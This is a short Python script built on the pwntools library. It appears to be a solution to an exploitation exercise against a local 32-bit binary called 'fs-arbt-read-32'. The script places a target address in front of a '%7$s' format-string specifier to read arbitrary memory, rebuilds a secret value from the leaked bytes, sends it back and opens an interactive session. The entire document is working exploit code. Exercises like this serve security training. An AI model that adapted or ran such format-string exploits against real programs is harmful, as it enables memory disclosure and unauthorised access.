#!/usr/bin/env python
from pwn import *
while True:
        p = process('./fs-arbt-read-32')

        buf = p32(0x804a050)
        buf += '%7$s'
        p.recv()
        p.sendline(buf)
        q = (p.readline())
        mystr = (str(hex(u32(q[-4:]))))
        mystr = '0x' + mystr[3:] + 'db'
        print(mystr)
        p.sendline(mystr)
        p.interactive()
        p.close()